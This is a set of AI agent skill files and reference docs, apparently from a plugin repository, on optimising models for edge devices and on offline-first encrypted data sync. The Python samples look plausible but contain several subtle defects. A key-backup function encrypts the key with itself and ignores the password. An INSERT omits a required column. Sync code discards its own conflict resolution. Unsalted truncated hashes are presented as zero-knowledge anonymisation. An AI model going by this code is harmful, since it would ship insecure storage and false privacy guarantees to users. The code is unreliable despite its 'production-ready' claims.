        "plugins/sys-edge/skills/experimenting-edge/SKILL.md": "---\nname: experimenting-edge\ndescription: \"Optimizes AI models for edge deployment through quantization, lazy loading, and memory management. Use when deploying models to resource-constrained environments, mobile devices, or edge computing scenarios. Do not use for cloud deployment, model training, or data preprocessing.\"\nallowed-tools: [Read, Write, Edit, Glob, Grep, Bash]\n---\n\n# Edge AI Management Protocol\n\n\n\n## Core Responsibilities\n\n### 1. Model Management Strategy\n\n**Lazy Loading Implementation:**\n```python\n# Model loader with on-demand initialization\nclass LazyModelLoader:\n    def __init__(self, model_paths: Dict[str, str]):\n        self.loaded_models = {}\n        self.model_paths = model_paths\n        self.memory_threshold = 0.8  # 80% memory usage threshold\n\n    def load_model(self, model_name: str) -> Optional[Any]:\n        \"\"\"Load model only when needed\"\"\"\n        if model_name not in self.loaded_models:\n            if self._check_memory_pressure():\n                self._unload_least_recently_used()\n            self.loaded_models[model_name] = self._load_from_disk(model_name)\n        return self.loaded_models[model_name]\n```\n\n**Memory Pressure Detection:**\n- Monitor RAM usage via `psutil`\n- Trigger unload when memory > 80%\n- LRU (Least Recently Used) eviction strategy\n- Preload frequently used models during idle time\n\n### 2. Quantization Strategy\n\n**Dynamic Quantization Based on Device Capabilities:**\n\n```python\nclass QuantizationManager:\n    def __init__(self):\n        self.device_capabilities = self._detect_device_capabilities()\n\n    def _detect_device_capabilities(self) -> Dict[str, Any]:\n        return {\n            'ram_gb': psutil.virtual_memory().total / (1024**3),\n            'cpu_cores': psutil.cpu_count(),\n            'device_age': self._estimate_device_age(),\n            'gpu_available': torch.cuda.is_available()\n        }\n\n    def get_quantization_config(self, model_size: str) -> str:\n        \"\"\"Return optimal quantization based on device\"\"\"\n        ram = self.device_capabilities['ram_gb']\n\n        if ram < 4:\n            return \"int4\"  # Aggressive quantization for older devices\n        elif ram < 8:\n            return \"int8\"  # Balanced for mid-range devices\n        else:\n            return \"fp16\"  # Minimal quantization for high-end devices\n```\n\n**Quantization Levels:**\n- **int4**: 4-bit quantization for devices < 4GB RAM (pre-2020)\n- **int8**: 8-bit quantization for devices 4-8GB RAM\n- **fp16**: 16-bit floating point for devices > 8GB RAM\n\n### 3. Context Window Management\n\n**Sliding Window with Semantic Chunking:**\n\n```python\nclass ContextWindowManager:\n    def __init__(self, max_tokens: int = 4096):\n        self.max_tokens = max_tokens\n        self.current_context = []\n        self.embedding_cache = {}\n\n    def add_to_context(self, text: str) -> None:\n        \"\"\"Add text with smart context management\"\"\"\n        tokens = self._tokenize(text)\n\n        if len(tokens) > self.max_tokens:\n            # Use semantic chunking to preserve relevant context\n            chunks = self._semantic_chunk(tokens)\n            self.current_context.extend(chunks)\n            self._prune_context()\n        else:\n            self.current_context.append(text)\n            self._prune_context()\n\n    def _semantic_chunking(self, tokens: List[str]) -> List[str]:\n        \"\"\"Chunk preserving semantic coherence\"\"\"\n        # Use embedding similarity to group related content\n        embeddings = self._compute_embeddings(tokens)\n        # Group by similarity threshold\n        # Keep most recent + most relevant chunks\n        return self._select_optimal_chunks(embeddings)\n```\n\n### 4. Battery Optimization\n\n**Batch Inference and Throttling:**\n\n```python\nclass BatteryOptimizer:\n    def __init__(self):\n        self.battery = psutil.sensors_battery()\n        self.batch_queue = []\n        self.batch_size = 10\n        self.low_battery_mode = False\n\n    def should_batch_inference(self) -> bool:\n        \"\"\"Determine if batching is beneficial\"\"\"\n        if self.battery.percent < 20:\n            self.low_battery_mode = True\n            return True  # Always batch in low battery\n        return len(self.batch_queue) >= self.batch_size\n\n    def add_inference_request(self, request: Dict) -> None:\n        \"\"\"Queue request for batch processing\"\"\"\n        self.batch_queue.append(request)\n\n        if self.should_batch_inference():\n            self._process_batch()\n\n    def _process_batch(self) -> None:\n        \"\"\"Process queued requests in batch\"\"\"\n        if not self.batch_queue:\n            return\n\n        # Single inference for entire batch\n        batch_input = self._combine_batch_inputs(self.batch_queue)\n        results = self._run_inference(batch_input)\n\n        # Distribute results\n        self._distribute_results(results)\n        self.batch_queue.clear()\n```\n\n### 5. Model Selection Algorithm\n\n**Runtime Model Selection:**\n\n```python\nclass ModelSelector:\n    def __init__(self):\n        self.available_models = {\n            'small': {'size_mb': 100, 'quality': 0.7, 'speed': 0.9},\n            'medium': {'size_mb': 500, 'quality': 0.85, 'speed': 0.7},\n            'large': {'size_mb': 2000, 'quality': 0.95, 'speed': 0.4}\n        }\n\n    def select_model(self, task_type: str, constraints: Dict) -> str:\n        \"\"\"Select optimal model based on task and constraints\"\"\"\n        available_ram = constraints.get('available_ram_gb', 4)\n        battery_percent = constraints.get('battery_percent', 100)\n        priority = constraints.get('priority', 'balanced')  # speed, quality, balanced\n\n        # Filter models that fit in memory\n        feasible_models = [\n            name for name, specs in self.available_models.items()\n            if specs['size_mb'] < (available_ram * 1024 * 0.6)  # Use max 60% of RAM\n        ]\n\n        if not feasible_models:\n            return 'small'  # Fallback to smallest model\n\n        # Score models based on priority\n        scored_models = []\n        for model in feasible_models:\n            specs = self.available_models[model]\n            score = self._calculate_score(specs, priority, battery_percent)\n            scored_models.append((model, score))\n\n        # Return highest scoring model\n        return max(scored_models, key=lambda x: x[1])[0]\n\n    def _calculate_score(self, specs: Dict, priority: str, battery: int) -> float:\n        \"\"\"Calculate model suitability score\"\"\"\n        if priority == 'speed':\n            return specs['speed'] * (1 if battery > 30 else 0.5)\n        elif priority == 'quality':\n            return specs['quality'] * (1 if battery > 20 else 0.3)\n        else:  # balanced\n            return (specs['speed'] + specs['quality']) / 2 * (1 if battery > 25 else 0.4)\n```\n\n## Implementation Patterns\n\n### Pattern 1: Resource-Aware Model Loading\n```python\n# Example usage\nmanager = EdgeAIManager()\n\n# Load model based on current resources\nmodel = manager.load_model(\n    model_name=\"text_generator\",\n    constraints={\n        'max_memory_mb': 512,\n        'battery_percent': 45,\n        'priority': 'balanced'\n    }\n)\n\n# Model automatically quantized and optimized\noutput = model.generate(input_text)\n```\n\n### Pattern 2: Context-Aware Processing\n```python\n# Context window automatically manages memory\ncontext_manager = ContextWindowManager(max_tokens=2048)\n\nfor document in documents:\n    context_manager.add_to_context(document)\n    # Oldest/least relevant context automatically pruned\n```\n\n### Pattern 3: Battery-Smart Inference\n```python\n# Inference automatically optimized for battery\noptimizer = BatteryOptimizer()\n\n# Requests automatically batched in low battery\noptimizer.add_inference_request(request1)\noptimizer.add_inference_request(request2)\n# Processed together when batch threshold reached or battery low\n```\n\n## Integration with CatToolkit\n\n**Usage in Builder Workflow:**\n```bash\n# Use edge-ai-management skill for mobile optimization\n\"Optimize this model for edge deployment on mobile devices\"\n\n# Skill automatically:\n# 1. Detects device capabilities\n# 2. Applies appropriate quantization\n# 3. Configures memory management\n# 4. Implements battery optimization\n# 5. Generates deployment configuration\n```\n\n## Quality Gates\n\n- Model size after quantization < 60% of available RAM\n- Battery impact < 10% per hour of active use\n- Context window maintains semantic coherence\n- Memory pressure never exceeds 80%\n- Cold start time < 3 seconds for cached models\n\n## Files Generated\n\n- `model_config.json`: Quantization and optimization settings\n- `deployment_config.yaml`: Mobile deployment configuration\n- `resource_monitor.py`: Runtime resource tracking\n- `battery_optimizer.py`: Battery-aware processing logic\n\n## Integration Notes\n\n- For offline model synchronization, use the `synchronizing-data` skill\n- Hardware-specific optimizations (NNAPI, CoreML) require platform-specific build configuration\n- Battery monitoring patterns above are self-contained and production-ready\n",
        "plugins/sys-edge/skills/experimenting-edge/assets/templates/standard-skill.md": "---\nname: {SKILL_NAME}\ndescription: {SKILL_DESCRIPTION}\ncontext: fork\nagent: {OPTIONAL_PERSONA}\nallowed-tools: {RESTRICTED_TOOLS}\n---\n\n# {HUMAN_READABLE_NAME}\n\n## 1. Core Knowledge\n{Passive knowledge base, key concepts, and terminology}\n\n## 2. Decision Logic / Protocol\n{Guidelines for the AI to follow when invoking this skill}\n\n## 3. Success Criteria\n{How to determine if the goal was achieved}\n\n## 4. Anti-Patterns\n{What to avoid}\n",
        "plugins/sys-edge/skills/synchronizing-data/SKILL.md": "---\nname: synchronizing-data\ndescription: \"Implements offline-first synchronization with encrypted local storage and intelligent conflict resolution for mobile AI applications. Use when building offline-capable mobile apps, implementing sync with privacy requirements, or managing encrypted local data persistence. Do not use for cloud databases, real-time websocket sync, or server-side data management.\"\nallowed-tools: [Read, Write, Edit, Glob, Grep, Bash]\n---\n\n# Offline-First Sync Protocol\n\n\n\n## Core Responsibilities\n\n### 1. Encrypted Local Storage\n**User-Controlled Encryption**\n\n- All data encrypted with user-controlled keys\n- SQLite database with encryption at rest\n- Keys never stored in plain text\n- User can export encrypted backups\n\n**Key Features:**\n- Fernet encryption for secure storage\n- Automatic timestamp tracking\n- Efficient query performance\n- Export/import capabilities\n\n**Reference:** [encryption.md](references/encryption.md) for complete implementation\n\n### 2. Conflict Resolution\n**Intelligent Conflict Resolution**\n\n- Multiple resolution strategies (timestamp, priority, merge)\n- Automatic conflict type detection\n- User choice for critical conflicts\n- Merge-compatible data structures\n\n**Resolution Strategies:**\n- **Timestamp**: Most recent change wins\n- **Priority**: Higher priority data wins\n- **Merge**: Recursively merge compatible structures\n- **User Choice**: Explicit user decision\n\n**Reference:** [conflict-resolution.md](references/conflict-resolution.md) for strategies and algorithms\n\n### 3. Incremental Sync\n**Delta-Based Synchronization**\n\n- Only sync changed data (delta sync)\n- Tracks sync state across sessions\n- Handles batch operations efficiently\n- Automatic retry on failure\n\n**Sync Components:**\n- Local change detection\n- Remote change application\n- State persistence\n- Conflict handling\n\n**Reference:** [incremental-sync.md](references/incremental-sync.md) for sync logic and state management\n\n### 4. Privacy-First Architecture\n**Zero-Knowledge Sync**\n\n- Explicit user permission for all data sharing\n- Anonymization of sensitive fields\n- End-to-end encryption\n- Purpose-limited data usage\n\n**Privacy Principles:**\n- Data minimization\n- Explicit consent\n- Encryption everywhere\n- Zero-knowledge design\n\n**Reference:** [privacy-first.md](references/privacy-first.md) for anonymization and permission models\n\n## Implementation Patterns\n\n### Pattern 1: Offline-First App Storage\n```python\n# Initialize encrypted storage\nstore = EncryptedLocalStore(\n    db_path=\"./app_data.db\",\n    user_key=user_provided_key\n)\n\n# Store data (automatically encrypted)\nstore.store(\"user_preferences\", {\n    \"theme\": \"dark\",\n    \"language\": \"en\",\n    \"model_preferences\": {\"quality\": \"high\"}\n})\n\n# Data encrypted with user's key, never leaves device unencrypted\n```\n\n### Pattern 2: Conflict-Aware Sync\n```python\n# Configure incremental sync\nsync_manager = IncrementalSync(local_store=store)\n\n# Prepare and send sync package\nsync_package = sync_manager.prepare_sync_package()\nserver_response = sync_to_server(sync_package)\n\n# Apply remote changes with automatic conflict resolution\napplied, conflicts = sync_manager.apply_remote_changes(\n    server_response['changes']\n)\n\n# Conflicts automatically resolved, user notified if needed\n```\n\n### Pattern 3: Privacy-Preserving Sync\n```python\n# Request explicit permission\nif privacy_sync.request_sync_permission(\n    data_type=\"model_usage_stats\",\n    purpose=\"improve_model_quality\"\n):\n    # Sync only anonymized data\n    privacy_sync.sync_with_privacy(\n        data=usage_stats,\n        destination=\"model_improvement_server\"\n    )\n```\n\n## Sync States\n\nThe system operates through clear state transitions:\n\n- **Offline**: All changes stored locally\n- **Syncing**: In progress with remote server\n- **Conflict**: Conflicts detected, awaiting resolution\n- **Up-to-Date**: Synchronized successfully\n- **Error**: Sync failed, will retry\n\n**State Management:** [sync-states.md](references/sync-states.md) for state machine and transitions\n\n## Quality Gates\n\n All data encrypted with user-controlled keys\n No raw sensitive data transmitted\n Conflicts detected and resolved within 24 hours\n Sync completes within 30 seconds on stable connection\n Offline mode fully functional for 30+ days\n User can export/import their encrypted data\n Explicit permission for all data sharing\n Privacy-preserving sync patterns enforced\n\n## Files Generated\n\n- `encrypted_storage.py`: User-key encrypted local database\n- `conflict_resolution.py`: Intelligent conflict resolution strategies\n- `incremental_sync.py`: Delta-based synchronization logic\n- `privacy_sync.py`: Privacy-preserving sync patterns\n- `sync_state_manager.py`: Sync state tracking and management\n\n## Next Steps\n\n1. Initialize `EncryptedLocalStore` with user key\n2. Configure conflict resolution strategy\n3. Set up incremental sync with state tracking\n4. Implement privacy-first permission system\n5. Test sync across network disruptions\n6. Verify encryption and privacy guarantees\n7. Add sync state monitoring to UI\n",
        "plugins/sys-edge/skills/synchronizing-data/assets/templates/progressive-disclosure.md": "---\nname: NAME_HERE\ndescription: \"{Action Verb} + {Trigger} + {Purpose} - MUST USE when WORKFLOW_TRIGGER_KEYWORDS to progressively disclose TASK_NAME_HERE knowledge\"\n---\n\n# TASK_NAME_HERE\n\n## Overview\n\nBrief description of what this skill accomplishes and when to use it.\n\n## Quick Start\n\nImmediate solution for common case:\n\n```language\n// Code example\nquick_solution()\n```\n\n## Foundational Knowledge\n\n**Before executing this workflow, review:**\n- Domain expertise and best practices\n- Quality standards and success criteria\n- Safety and validation requirements\n\n## Core Concepts\n\n- **Concept 1**: Brief explanation\n- **Concept 2**: Brief explanation\n- **Concept 3**: Brief explanation\n\n## Operational Protocol\n\n**Strong Core:**\n1. **First step**: Description of what to do\n2. **Second step**: Description of what to do\n3. **Third step**: Description of what to do\n\n**Flexible Application:**\n- Agents can adapt steps to their specific context\n- Choose appropriate tools for the environment\n- Apply guidance to particular implementation needs\n\n## Progressive Disclosure\n\n**Advanced Topics:**\n- Create `references/` subdirectory for detailed documentation\n- Reference files with appropriate markdown links\n- Keep SKILL.md under 500 lines\n- Load only relevant reference files based on workflow context\n\n## Common Patterns\n\n- **Pattern 1**: When to use it\n- **Pattern 2**: When to use it\n\n## Scripts\n\nUse bundled scripts:\n\n```bash\n# Script usage\npython scripts/script_name.py [arguments]\n```\n\n## Common Options\n\n- **Option 1**: When to use it\n- **Option 2**: When to use it\n- **Option 3**: When to use it\n\n## Common Issues\n\n- **Problem 1**: Solution\n- **Problem 2**: Solution\n\n## Troubleshooting\n\n- **Issue 1**: Solution\n- **Issue 2**: Solution\n\n## Success Criteria\n\n**Strong Quality Gates:**\n- [ ] Expected outcome 1\n- [ ] Expected outcome 2\n\n**Agent Adaptation:**\n- [ ] Outcome meets quality standards\n- [ ] Solution appropriate for context\n- [ ] Safety protocols followed\n- [ ] Progressive disclosure maintained (SKILL.md < 500 lines)\n",
        "plugins/sys-edge/skills/synchronizing-data/references/conflict-resolution.md": "# Conflict Resolution\n\n## Overview\n\nThe `ConflictResolver` class implements intelligent strategies for resolving data conflicts during offline-first synchronization. It supports multiple resolution strategies and automatically detects conflict types.\n\n## Implementation\n\n```python\nclass ConflictResolver:\n    def __init__(self):\n        self.resolution_strategies = {\n            'timestamp': self._resolve_by_timestamp,\n            'priority': self._resolve_by_priority,\n            'merge': self._resolve_by_merging,\n            'user_choice': self._resolve_by_user_choice\n        }\n\n    def resolve_conflict(self, local_data: Dict, remote_data: Dict, context: Dict) -> Dict:\n        \"\"\"Resolve sync conflicts using appropriate strategy\"\"\"\n        conflict_type = self._detect_conflict_type(local_data, remote_data)\n\n        if conflict_type == 'no_conflict':\n            return remote_data if context.get('prefer_remote', False) else local_data\n\n        strategy = context.get('resolution_strategy', 'timestamp')\n        resolver = self.resolution_strategies[strategy]\n\n        return resolver(local_data, remote_data, context)\n\n    def _resolve_by_timestamp(self, local: Dict, remote: Dict, context: Dict) -> Dict:\n        \"\"\"Use timestamps to resolve conflicts\"\"\"\n        local_time = local.get('updated_at', 0)\n        remote_time = remote.get('updated_at', 0)\n\n        return remote if remote_time > local_time else local\n\n    def _resolve_by_priority(self, local: Dict, remote: Dict, context: Dict) -> Dict:\n        \"\"\"Use data priority to resolve conflicts\"\"\"\n        local_priority = local.get('priority', 0)\n        remote_priority = remote.get('priority', 0)\n\n        return remote if remote_priority > local_priority else local\n\n    def _resolve_by_merging(self, local: Dict, remote: Dict, context: Dict) -> Dict:\n        \"\"\"Merge compatible data structures\"\"\"\n        merged = local.copy()\n\n        # Merge compatible fields\n        for key, value in remote.items():\n            if key not in merged:\n                merged[key] = value\n            elif isinstance(merged[key], dict) and isinstance(value, dict):\n                merged[key] = self._resolve_by_merging(merged[key], value, context)\n            elif isinstance(merged[key], list) and isinstance(value, list):\n                # Merge lists, removing duplicates\n                merged[key] = list(set(merged[key] + value))\n\n        merged['merged_from'] = {'local': local.get('id'), 'remote': remote.get('id')}\n        merged['merge_conflict'] = True\n\n        return merged\n\n    def _detect_conflict_type(self, local: Dict, remote: Dict) -> str:\n        \"\"\"Detect type of conflict\"\"\"\n        if not remote:\n            return 'no_conflict'\n\n        local_id = local.get('id')\n        remote_id = remote.get('id')\n\n        if local_id != remote_id:\n            return 'different_records'\n\n        local_version = local.get('version', 0)\n        remote_version = remote.get('version', 0)\n\n        if local_version != remote_version:\n            return 'version_conflict'\n\n        return 'no_conflict'\n```\n\n## Resolution Strategies\n\n### 1. Timestamp-Based Resolution\n**Use case**: Most common for user-generated content\n- Uses `updated_at` timestamps\n- Most recent change wins\n- Simple and predictable\n\n### 2. Priority-Based Resolution\n**Use case**: Administrative or system-generated data\n- Uses `priority` field\n- Higher priority wins\n- Useful for system updates\n\n### 3. Merge-Based Resolution\n**Use case**: Complex nested data structures\n- Recursively merges dictionaries\n- Combines lists (removing duplicates)\n- Marks conflicts for review\n- Maintains data lineage\n\n### 4. User Choice Resolution\n**Use case**: Critical conflicts requiring human input\n- Presents options to user\n- Records user decision\n- Learns from user preferences\n\n## Conflict Detection\n\nThe system automatically detects:\n\n- **No Conflict**: Data is identical or compatible\n- **Different Records**: Different IDs (not a conflict)\n- **Version Conflict**: Same ID, different versions (requires resolution)\n\n## Usage\n\n```python\nresolver = ConflictResolver()\n\n# Resolve with timestamp strategy\nresult = resolver.resolve_conflict(\n    local_data=local,\n    remote_data=remote,\n    context={'resolution_strategy': 'timestamp'}\n)\n\n# Resolve with merge strategy\nresult = resolver.resolve_conflict(\n    local_data=local,\n    remote_data=remote,\n    context={'resolution_strategy': 'merge'}\n)\n```\n\n## Integration Points\n\n- Used by `IncrementalSync.apply_remote_changes()` for conflict resolution\n- Returns conflict metadata for UI display\n- Supports custom resolution strategies via context\n\n## Best Practices\n\n1. **Default to timestamp** for user-generated content\n2. **Use priority** for system data\n3. **Merge cautiously** for complex structures\n4. **Log conflicts** for debugging\n5. **Test all strategies** with your data types\n",
        "plugins/sys-edge/skills/synchronizing-data/references/encryption.md": "# Encrypted Local Storage\n\n## Overview\n\nThe `EncryptedLocalStore` class implements user-controlled encryption for offline-first mobile AI applications. All data is encrypted with keys controlled by the user, never stored in plain text.\n\n## Implementation\n\n```python\nfrom cryptography.fernet import Fernet\nimport sqlite3\nimport hashlib\n\nclass EncryptedLocalStore:\n    def __init__(self, db_path: str, user_key: Optional[bytes] = None):\n        self.db_path = db_path\n        self.encryption_key = user_key or self._generate_user_key()\n        self.cipher = Fernet(self.encryption_key)\n        self._init_database()\n\n    def _generate_user_key(self) -> bytes:\n        \"\"\"Generate encryption key from user credentials (never stored)\"\"\"\n        # In production, derive from user password/PIN\n        # For demo, generate random key\n        return Fernet.generate_key()\n\n    def _init_database(self):\n        \"\"\"Initialize SQLite database with encrypted storage\"\"\"\n        conn = sqlite3.connect(self.db_path)\n        conn.execute(\"\"\"\n            CREATE TABLE IF NOT EXISTS encrypted_data (\n                id TEXT PRIMARY KEY,\n                data BLOB NOT NULL,\n                iv BLOB NOT NULL,\n                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n            )\n        \"\"\")\n        conn.commit()\n        conn.close()\n\n    def store(self, key: str, data: Dict) -> bool:\n        \"\"\"Store data encrypted with user's key\"\"\"\n        try:\n            # Serialize data\n            serialized = json.dumps(data).encode()\n\n            # Encrypt with user's key\n            encrypted = self.cipher.encrypt(serialized)\n\n            # Store in database\n            conn = sqlite3.connect(self.db_path)\n            conn.execute(\n                \"INSERT OR REPLACE INTO encrypted_data (id, data, updated_at) VALUES (?, ?, CURRENT_TIMESTAMP)\",\n                (key, encrypted)\n            )\n            conn.commit()\n            conn.close()\n\n            return True\n        except Exception as e:\n            print(f\"Storage error: {e}\")\n            return False\n\n    def retrieve(self, key: str) -> Optional[Dict]:\n        \"\"\"Retrieve and decrypt data\"\"\"\n        try:\n            conn = sqlite3.connect(self.db_path)\n            cursor = conn.execute(\n                \"SELECT data FROM encrypted_data WHERE id = ?\",\n                (key,)\n            )\n            row = cursor.fetchone()\n            conn.close()\n\n            if not row:\n                return None\n\n            # Decrypt with user's key\n            decrypted = self.cipher.decrypt(row[0])\n            return json.loads(decrypted.decode())\n\n        except Exception as e:\n            print(f\"Retrieval error: {e}\")\n            return None\n\n    def export_key_for_backup(self, password: str) -> str:\n        \"\"\"Export encrypted key for user backup\"\"\"\n        # Never export raw key\n        # Export key encrypted with user's password\n        password_hash = hashlib.sha256(password.encode()).digest()\n        key_export = self.cipher.encrypt(self.encryption_key)\n\n        return base64.b64encode(key_export).decode()\n```\n\n## Key Features\n\n### User-Controlled Encryption\n- Encryption keys are derived from user credentials (password/PIN)\n- Keys are never stored in plain text\n- Users can export encrypted backups using their password\n\n### SQLite Integration\n- Efficient local storage using SQLite\n- All data encrypted before storage\n- Automatic timestamps for conflict resolution\n\n### Error Handling\n- Graceful handling of storage failures\n- Return codes for success/failure\n- Logging without exposing sensitive data\n\n## Usage\n\n```python\n# Initialize with user key\nstore = EncryptedLocalStore(\n    db_path=\"app_data.db\",\n    user_key=user_provided_key\n)\n\n# Store data (automatically encrypted)\nsuccess = store.store(\"user_profile\", {\n    \"name\": \"John Doe\",\n    \"preferences\": {\"theme\": \"dark\"}\n})\n\n# Retrieve data (automatically decrypted)\ndata = store.retrieve(\"user_profile\")\n```\n\n## Integration Points\n\n- Used by `IncrementalSync` for storing sync state\n- Referenced by `SyncStateManager` for metadata storage\n- Supports conflict resolution through timestamp tracking\n\n## Security Considerations\n\n- **Never log encryption keys**\n- **Never store plaintext data**\n- **Always use user-provided or derived keys**\n- **Export keys only when explicitly requested by user**\n",
        "plugins/sys-edge/skills/synchronizing-data/references/incremental-sync.md": "# Incremental Synchronization\n\n## Overview\n\nThe `IncrementalSync` class implements delta-based synchronization for efficient offline-first data sync. It tracks changes since last sync and applies remote changes with conflict resolution.\n\n## Implementation\n\n```python\nclass IncrementalSync:\n    def __init__(self, local_store: EncryptedLocalStore):\n        self.local_store = local_store\n        self.sync_state = self._load_sync_state()\n\n    def _load_sync_state(self) -> Dict:\n        \"\"\"Load sync state (timestamps, versions, etc.)\"\"\"\n        return self.local_store.retrieve('__sync_state__') or {\n            'last_sync_timestamp': 0,\n            'synced_items': {},\n            'pending_deletions': [],\n            'version': 1\n        }\n\n    def get_local_changes(self, since_timestamp: float) -> List[Dict]:\n        \"\"\"Get all local changes since last sync\"\"\"\n        changes = []\n\n        # Query local database for changes\n        conn = sqlite3.connect(self.local_store.db_path)\n        cursor = conn.execute(\"\"\"\n            SELECT id, data, updated_at\n            FROM encrypted_data\n            WHERE updated_at > ?\n            AND id NOT LIKE '__%'  # Exclude system tables\n        \"\"\", (since_timestamp,))\n\n        for row in cursor.fetchall():\n            changes.append({\n                'id': row[0],\n                'data': self.local_store.retrieve(row[0]),\n                'timestamp': row[2],\n                'operation': 'upsert'\n            })\n\n        conn.close()\n        return changes\n\n    def apply_remote_changes(self, remote_changes: List[Dict]) -> List[Dict]:\n        \"\"\"Apply remote changes to local storage\"\"\"\n        applied_changes = []\n        conflicts = []\n\n        for change in remote_changes:\n            try:\n                local_data = self.local_store.retrieve(change['id'])\n\n                if local_data:\n                    # Conflict resolution needed\n                    resolved = ConflictResolver().resolve_conflict(\n                        local_data=local_data,\n                        remote_data=change['data'],\n                        context={'resolution_strategy': 'timestamp'}\n                    )\n\n                    if resolved.get('merge_conflict'):\n                        conflicts.append({\n                            'id': change['id'],\n                            'local': local_data,\n                            'remote': change['data'],\n                            'resolved': resolved\n                        })\n\n                # Store resolved data\n                self.local_store.store(change['id'], change['data'])\n                applied_changes.append(change['id'])\n\n            except Exception as e:\n                print(f\"Failed to apply change {change['id']}: {e}\")\n\n        return applied_changes, conflicts\n\n    def prepare_sync_package(self) -> Dict:\n        \"\"\"Prepare package for remote synchronization\"\"\"\n        last_sync = self.sync_state['last_sync_timestamp']\n        local_changes = self.get_local_changes(last_sync)\n\n        return {\n            'version': self.sync_state['version'],\n            'changes': local_changes,\n            'timestamp': time.time(),\n            'pending_deletions': self.sync_state['pending_deletions']\n        }\n```\n\n## Sync State Tracking\n\n### State Structure\n```python\n{\n    'last_sync_timestamp': 0,      # Last successful sync time\n    'synced_items': {},             # Map of synced item IDs to timestamps\n    'pending_deletions': [],        # Items deleted locally, pending remote sync\n    'version': 1                   # Sync protocol version\n}\n```\n\n### State Persistence\n- Stored in `EncryptedLocalStore` as `__sync_state__`\n- Updated after each successful sync\n- Maintains continuity across app restarts\n\n## Change Detection\n\n### Local Changes\n- Queries SQLite for items updated since last sync\n- Excludes system tables (prefixed with `__`)\n- Returns operations with metadata\n\n### Remote Changes\n- Accepts batch of remote changes\n- Automatically applies conflict resolution\n- Tracks successful and failed applications\n\n## Sync Package Format\n\n```python\n{\n    'version': 1,                  # Sync protocol version\n    'changes': [                    # Array of changes\n        {\n            'id': 'item_123',\n            'data': {...},          # Encrypted item data\n            'timestamp': 1234567890,\n            'operation': 'upsert'    # or 'delete'\n        }\n    ],\n    'timestamp': 1234567890,        # Package generation time\n    'pending_deletions': ['id1', 'id2']  # Items to delete remotely\n}\n```\n\n## Usage\n\n```python\nsync = IncrementalSync(local_store)\n\n# Get changes since last sync\nchanges = sync.get_local_changes(\n    since_timestamp=sync.sync_state['last_sync_timestamp']\n)\n\n# Apply remote changes\napplied, conflicts = sync.apply_remote_changes(remote_changes)\n\n# Prepare sync package for upload\npackage = sync.prepare_sync_package()\n```\n\n## Integration Points\n\n- Uses `EncryptedLocalStore` for state persistence\n- Uses `ConflictResolver` for handling conflicts\n- Referenced by `SyncStateManager` for state updates\n\n## Performance Optimizations\n\n1. **Delta Sync Only**: Only transfers changed items\n2. **SQLite Indexing**: Indexed by timestamp for fast queries\n3. **Batch Operations**: Applies changes in batches\n4. **Lazy Loading**: Loads data only when needed\n\n## Error Handling\n\n- Continues on individual item failures\n- Logs errors without exposing data\n- Returns success/failure counts\n- Allows partial sync completion\n\n## Best Practices\n\n1. **Sync frequently** to minimize conflicts\n2. **Use timestamps** consistently\n3. **Handle conflicts** proactively\n4. **Test with large datasets**\n5. **Monitor sync performance**\n",
        "plugins/sys-edge/skills/synchronizing-data/references/privacy-first.md": "# Privacy-First Architecture\n\n## Overview\n\nThe `PrivacyFirstSync` class implements zero-knowledge synchronization patterns that preserve user privacy by design. It anonymizes data, uses encryption, and requires explicit user permission for all data sharing.\n\n## Implementation\n\n```python\nclass PrivacyFirstSync:\n    def __init__(self):\n        self.encryption_manager = None\n        self.anonymizer = DataAnonymizer()\n\n    def sync_with_privacy(self, data: Dict, destination: str) -> bool:\n        \"\"\"Sync data with privacy preservation\"\"\"\n        # 1. Anonymize sensitive fields\n        anonymized = self.anonymizer.anonymize(data)\n\n        # 2. Encrypt with destination-specific key\n        encrypted = self.encryption_manager.encrypt_for_destination(\n            data=anonymized,\n            destination=destination\n        )\n\n        # 3. Send encrypted data\n        success = self._send_encrypted_data(encrypted, destination)\n\n        # 4. Never send raw data\n        # 5. Never log sensitive information\n        return success\n\n    def request_sync_permission(self, data_type: str, purpose: str) -> bool:\n        \"\"\"Request explicit user permission for sync\"\"\"\n        permission_request = {\n            'data_type': data_type,\n            'purpose': purpose,\n            'timestamp': time.time(),\n            'user_confirmation': None\n        }\n\n        # Present clear, understandable permission request\n        # User must explicitly approve\n        return self._prompt_user_permission(permission_request)\n\nclass DataAnonymizer:\n    def __init__(self):\n        self.sensitive_fields = [\n            'email', 'phone', 'name', 'address',\n            'device_id', 'location', 'biometric'\n        ]\n\n    def anonymize(self, data: Dict) -> Dict:\n        \"\"\"Remove or hash sensitive information\"\"\"\n        anonymized = data.copy()\n\n        for field in self.sensitive_fields:\n            if field in anonymized:\n                # Hash sensitive fields\n                anonymized[field] = hashlib.sha256(\n                    str(anonymized[field]).encode()\n                ).hexdigest()[:16]\n\n        return anonymized\n```\n\n## Core Principles\n\n### 1. Explicit User Permission\n**Always required for data sharing:**\n- Clear purpose statements\n- Specific data type requests\n- Time-bound permissions\n- Easy revocation\n\n### 2. Data Minimization\n**Only sync what's necessary:**\n- Anonymize or hash sensitive fields\n- Remove unnecessary metadata\n- Use purpose-limited data\n\n### 3. Encryption Everywhere\n**End-to-end encryption:**\n- Data encrypted before transmission\n- Destination-specific keys\n- No plaintext data ever transmitted\n\n### 4. Zero-Knowledge Design\n**Server cannot read user data:**\n- All encryption/decryption client-side\n- Metadata minimized\n- Anonymous analytics only\n\n## Anonymization Strategies\n\n### Field-Level Anonymization\n```python\nsensitive_fields = [\n    'email',      # Hash to: abc123...\n    'phone',      # Hash to: def456...\n    'name',       # Hash to: ghi789...\n    'address',    # Hash to: jkl012...\n    'device_id',  # Hash to: mno345...\n    'location',   # Hash to: pqr678...\n    'biometric'   # Hash to: stu901...\n]\n```\n\n### Hashing Approach\n- Uses SHA-256 hashing\n- Truncated to 16 characters\n- Consistent across sessions\n- One-way transformation\n\n## Permission Model\n\n### Permission Request Format\n```python\n{\n    'data_type': 'usage_statistics',\n    'purpose': 'improve_model_accuracy',\n    'timestamp': 1234567890,\n    'user_confirmation': True,\n    'expires_at': 1234657890  # 1 day\n}\n```\n\n### Permission Lifecycle\n1. **Request**: Present clear purpose and data types\n2. **Grant**: User explicitly approves\n3. **Use**: Use data only for stated purpose\n4. **Expiry**: Automatically expire permissions\n5. **Revoke**: Allow easy revocation\n\n## Usage Examples\n\n### Sync Usage Statistics (Anonymized)\n```python\nprivacy_sync = PrivacyFirstSync()\n\n# Request permission\nif 